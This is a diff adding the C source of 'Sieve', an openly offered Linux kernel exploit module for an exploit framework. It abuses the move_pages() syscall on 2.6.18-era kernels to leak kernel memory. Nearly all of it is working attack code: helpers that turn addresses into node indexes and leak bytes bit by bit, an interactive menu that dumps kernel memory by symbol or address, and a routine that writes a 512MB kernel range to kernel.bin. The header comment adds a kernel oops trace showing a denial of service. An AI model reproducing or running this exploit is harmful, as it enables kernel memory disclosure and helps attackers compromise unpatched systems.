@@ -1,0 +1,323 @@
+/* sieve (because the Linux kernel leaks like one, get it?)
+   Bug NOT discovered by Marcus Meissner of SuSE security
+   This bug was discovered by Ramon de Carvalho Valle in September of 2009
+   The bug was found via fuzzing, and on Sept 24th I was sent a POC DoS
+   for the bug (but had forgotten about it until now)
+   Ramon's report was sent to Novell's internal bugzilla, upon which 
+   some months later Marcus took credit for discovering someone else's bug
+   Maybe he thought he could get away with it ;)  Almost ;)
+
+   greets to pipacs, tavis (reciprocal greets!), cloudburst, and rcvalle!
+
+   first exploit of 2010, next one will be for a bugclass that has
+   afaik never been exploited on Linux before
+
+   note that this bug can also cause a DoS like so:
+
+Unable to handle kernel paging request at ffffffff833c3be8 RIP: 
+ [<ffffffff800dc8ac>] new_page_node+0x31/0x48
+PGD 203067 PUD 205063 PMD 0 
+Oops: 0000 [1] SMP 
+Pid: 19994, comm: exploit Not tainted 2.6.18-164.el5 #1
+RIP: 0010:[<ffffffff800dc8ac>]  [<ffffffff800dc8ac>] 
+new_page_node+0x31/0x48
+RSP: 0018:ffff8100a3c6de50  EFLAGS: 00010246
+RAX: 00000000005fae0d RBX: ffff8100028977a0 RCX: 0000000000000013
+RDX: ffff8100a3c6dec0 RSI: 0000000000000000 RDI: 00000000000200d2
+RBP: 0000000000000000 R08: 0000000000000004 R09: 000000000000003c
+R10: 0000000000000000 R11: 0000000000000092 R12: ffffc20000077018
+R13: ffffc20000077000 R14: ffff8100a3c6df00 R15: ffff8100a3c6df28
+FS:  00002b8481125810(0000) GS:ffffffff803c0000(0000) 
+knlGS:0000000000000000
+CS:  0010 DS: 0000 ES: 0000 CR0: 000000008005003b
+CR2: ffffffff833c3be8 CR3: 000000009562d000 CR4: 00000000000006e0
+Process exploit (pid: 19994, threadinfo ffff8100a3c6c000, task 
+ffff81009d8c4080)
+Stack:  ffffffff800dd008 ffffc20000077000 ffffffff800dc87b 
+0000000000000000
+ 0000000000000000 0000000000000003 ffff810092c23800 0000000000000003
+ 00000000000000ff ffff810092c23800 00007eff6d3dc7ff 0000000000000000
+Call Trace:
+ [<ffffffff800dd008>] migrate_pages+0x8d/0x42b
+ [<ffffffff800dc87b>] new_page_node+0x0/0x48
+ [<ffffffff8009cee2>] schedule_on_each_cpu+0xda/0xe8
+ [<ffffffff800dd8a2>] sys_move_pages+0x339/0x43d
+ [<ffffffff8005d28d>] tracesys+0xd5/0xe0
+
+
+Code: 48 8b 14 c5 80 cb 3e 80 48 81 c2 10 3c 00 00 e9 82 29 f3 ff 
+RIP  [<ffffffff800dc8ac>] new_page_node+0x31/0x48
+ RSP <ffff8100a3c6de50>
+CR2: ffffffff833c3be8
+*/
+
+#include <stdio.h>
+#define _GNU_SOURCE
+#include <stdlib.h>
+#include <unistd.h>
+#include <string.h>
+#include <sys/syscall.h>
+#include <errno.h>
+#include "exp_framework.h"
+
+#undef MPOL_MF_MOVE
+#define MPOL_MF_MOVE (1 << 1)
+
+int max_numnodes;
+
+unsigned long node_online_map;
+
+unsigned long node_states;
+
+unsigned long our_base;
+unsigned long totalhigh_pages;
+
+#undef __NR_move_pages
+#ifdef __x86_64__
+#define __NR_move_pages 279
+#else
+#define __NR_move_pages 317
+#endif
+
+/* random notes I took when writing this (all applying to the 64bit case):
+
+checking in a bitmap based on node_states[2] or node_states[3] 
+(former if HIGHMEM is not present, latter if it is)
+
+each node_state is of type nodemask_t, which is is a bitmap of size 
+MAX_NUMNODES/8
+
+RHEL 5.4 has MAX_NUMNODES set to 64, which makes this 8 bytes in size
+
+so the effective base we're working with is either node_states + 16 or 
+node_states + 24
+
+on 2.6.18 it's based off node_online_map
+
+node_isset does a test_bit based on this base
+
+so our specfic case does: base[ourval / 8] & (1 << (ourval & 7))
+
+all the calculations appear to be signed, so we can both index in the 
+negative and positive direction, based on ourval
+
+on 64bit, this gives us a 256MB range above and below our base to grab 
+memory of 
+(by passing in a single page and a single node for each bit we want to 
+leak the value of, we can reconstruct entire bytes)
+
+we can determine MAX_NUMNODES by looking up two adjacent numa bitmaps,
+subtracting their difference, and multiplying by 8
+but we don't need to do this
+*/
+
+struct exploit_state *exp_state;
+
+char *desc = "Sieve: Linux 2.6.18+ move_pages() infoleak";
+
+int get_exploit_state_ptr(struct exploit_state *ptr)
+{
+	exp_state = ptr;
+	return 0;
+}
+
+int requires_null_page = 0;
+
+void addr_to_nodes(unsigned long addr, int *nodes)
+{
+	int i;
+	int min = 0x80000000 / 8;
+	int max = 0x7fffffff / 8; 
+
+	if ((addr < (our_base - min)) ||
+	    (addr > (our_base + max))) {
+		fprintf(stdout, "Error: Unable to dump address %p\n", addr);
+		exit(1);
+	}
+
+	for (i = 0; i < 8; i++) {
+		nodes[i] = ((int)(addr - our_base) << 3) | i;
+	}
+
+	return;
+}
+
+char *buf;
+unsigned char get_byte_at_addr(unsigned long addr)
+{
+	int nodes[8];
+	int node;
+	int status;
+	int i;
+	int ret;
+	unsigned char tmp = 0;
+
+	addr_to_nodes(addr, (int *)&nodes);
+	for (i = 0; i < 8; i++) {
+		node = nodes[i];
+		ret = syscall(__NR_move_pages, 0, 1, &buf, &node, &status, MPOL_MF_MOVE);
+		if (errno == ENOSYS) {
+			fprintf(stdout, "Error: move_pages is not supported on this kernel.\n");
+			exit(1);
+		} else if (errno != ENODEV)
+			tmp |= (1 << i);
+	}
+	
+	return tmp;
+}	
+
+void menu(void)
+{
+	fprintf(stdout, "Enter your choice:\n"
+			" [0] Dump via symbol/address with length\n"
+			" [1] Dump entire range to file\n"
+			" [2] Quit\n");
+}
+
+int trigger(void)
+{
+	unsigned long addr;
+	unsigned long addr2;
+	unsigned char thebyte;
+	unsigned char choice = 0;
+	char ibuf[1024];
+	char *p;
+	FILE *f;
+
+	// get lingering \n
+	getchar();
+	while (choice != '2') {
+		menu();
+		fgets((char *)&ibuf, sizeof(ibuf)-1, stdin);
+		choice = ibuf[0];
+		
+		switch (choice) {
+		case '0':
+			fprintf(stdout, "Enter the symbol or address for the base:\n");
+			fgets((char *)&ibuf, sizeof(ibuf)-1, stdin);
+			p = strrchr((char *)&ibuf, '\n');
+			if (p)
+				*p = '\0';
+			addr = exp_state->get_kernel_sym(ibuf);
+			if (addr == 0) {
+				addr = strtoul(ibuf, NULL, 16);
+			}
+			if (addr == 0) {
+				fprintf(stdout, "Invalid symbol or address.\n");
+				break;
+			}
+			addr2 = 0;
+			while (addr2 == 0) {
+				fprintf(stdout, "Enter the length of bytes to read in hex:\n");
+				fscanf(stdin, "%x", &addr2);
+				// get lingering \n
+				getchar();
+			}
+			addr2 += addr;
+			
+			fprintf(stdout, "Leaked bytes:\n");
+			while (addr < addr2) {	
+				thebyte = get_byte_at_addr(addr);
+				printf("%02x ", thebyte);
+				addr++;
+			}
+			printf("\n");
+			break;
+		case '1':
+			addr = our_base -  0x10000000;
+#ifdef __x86_64__
+			/* 
+			   our lower bound will cause us to access
+			   bad addresses and cause an oops
+			*/
+			if (addr < 0xffffffff80000000)
+				addr = 0xffffffff80000000;
+#else
+			if (addr < 0x80000000)
+				addr = 0x80000000;
+			else if (addr < 0xc0000000)
+				addr = 0xc0000000;
+#endif
+			addr2 = our_base + 0x10000000;
+			f = fopen("./kernel.bin", "w");
+			if (f == NULL) {
+				fprintf(stdout, "Error: unable to open ./kernel.bin for writing\n");
+				exit(1);
+			}
+
+			fprintf(stdout, "Dumping to kernel.bin (this will take a while): ");
+			fflush(stdout);
+			while (addr < addr2) {
+				thebyte = get_byte_at_addr(addr);
+				fputc(thebyte, f);
+				if (!(addr % (128 * 1024))) {
+					fprintf(stdout, ".");
+					fflush(stdout);
+				}
+				addr++;
+			}
+			fprintf(stdout, "done.\n");
+			fclose(f);
+			break;
+		case '2':
+			break;
+		}
+	}
+
+	return 0;
+}
+
+
+int prepare(unsigned char *ptr)
+{
+	int node;
+	int found_gap = 0;
+	int i;
+	int ret;
+	int status;
+
+	totalhigh_pages = exp_state->get_kernel_sym("totalhigh_pages");
+	node_states = exp_state->get_kernel_sym("node_states");
+	node_online_map = exp_state->get_kernel_sym("node_online_map");
+
+	buf = malloc(4096);
+
+	/* cheap hack, won't work on actual NUMA systems -- for those we could use the alternative noted
+	   towards the beginning of the file, here we're just working until we leak the first bit of the adjacent table,
+	   which will be set for our single node -- this gives us the size of the bitmap
+	*/
+	for (i = 0; i < 512; i++) {
+		node = i;
+		ret = syscall(__NR_move_pages, 0, 1, &buf, &node, &status, MPOL_MF_MOVE);
+		if (errno == ENOSYS) {
+			fprintf(stdout, "Error: move_pages is not supported on this kernel.\n");
+			exit(1);
+		} else if (errno == ENODEV) {
+			found_gap = 1;
+		} else if (found_gap == 1) {
+			max_numnodes = i;
+			fprintf(stdout, " [+] Detected MAX_NUMNODES as %d\n", max_numnodes);
+			break;
+		}
+	}
+
+	if (node_online_map != 0)
+		our_base = node_online_map;
+	/* our base for this depends on the existence of HIGHMEM and the value of MAX_NUMNODES, since it determines the size
+	   of each bitmap in the array our base is in the middle of
+	   we've taken account for all this
+	*/
+	else if (node_states != 0)
+		our_base = node_states + (totalhigh_pages ? (3 * (max_numnodes / 8)) : (2 * (max_numnodes / 8)));
+	else {
+		fprintf(stdout, "Error: kernel doesn't appear vulnerable.\n");
+		exit(1);
+	}
+
+	return 0;
+}
+
+int post(void)
+{
+	return 0;
+}
